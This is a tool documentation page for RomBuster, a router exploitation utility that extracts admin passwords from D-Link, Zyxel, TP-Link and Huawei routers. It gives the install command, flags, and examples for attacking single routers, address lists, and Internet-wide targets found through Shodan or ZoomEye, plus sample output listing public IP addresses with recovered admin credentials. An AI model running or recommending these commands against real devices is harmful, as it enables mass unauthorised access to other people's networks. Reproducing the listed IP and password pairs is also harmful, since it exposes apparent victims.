---
title : "RomBuster"
# pre : ' '
description : "RomBuster is a router exploitation tool that allows to disclosure network router admin password."
date : 2021-07-06T11:24:47+02:00
# hidden : true
# draft : true
weight : 1510
# tags : ['']
---

---

Is a router exploitation tool that allows to disclosure network router admin password.

**Features**:

- Exploits vulnerabilities in most popular routers such as D-Link, Zyxel, TP-Link and Huawei.
- Optimized to exploit multiple routers at one time from list.
- Simple CLI and API usage.

## Installation

```plain
python3 -m pip install git+https://github.com/EntySec/RomBuster
```

## Usage

```plain
rombuster [-h] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]
```

## Flags

```plain
RomBuster is a router exploitation tool that allows to disclosure network router admin password.

optional arguments:
  -h, --help            show this help message and exit
  -o OUTPUT, --output OUTPUT
                        Output result to file.
  -i INPUT, --input INPUT
                        Input file of addresses.
  -a ADDRESS, --address ADDRESS
                        Single address.
  --shodan SHODAN       Shodan API key for exploiting devices over Internet.
  --zoomeye ZOOMEYE     ZoomEye API key for exploiting devices over Internet.
  -p PAGES, --pages PAGES
                        Number of pages you want to get from ZoomEye.
```

## Examples

### Exploiting single router

Let's hack my router just for fun.

```plain
rombuster -a 192.168.99.1
```

### Exploiting routers from Internet

Let's try to use Shodan search engine to exploit routers over Internet.

```plain
rombuster --shodan [API-KEY]
```

```plain
$ rombuster --shodan [REDACTED]
[*] Authorizing Shodan by given API key...
[+] Authorization successfully completed!
[+] (187.200.68.1:80) - admin:3931623066
[+] (2.191.126.139:80) - admin:admin
[*] Exploiting...
```

### Exploiting routers from input file

Let's try to use opened database of routers.

```plain
rombuster -i routers.txt -o passwords.txt
```

NOTE: It will exploit all routers in `routers.txt` list by their addresses and save all obtained passwords to `passwords.txt`.

## URL List

- [Github.com - RomBuster](https://github.com/EntySec/RomBuster)
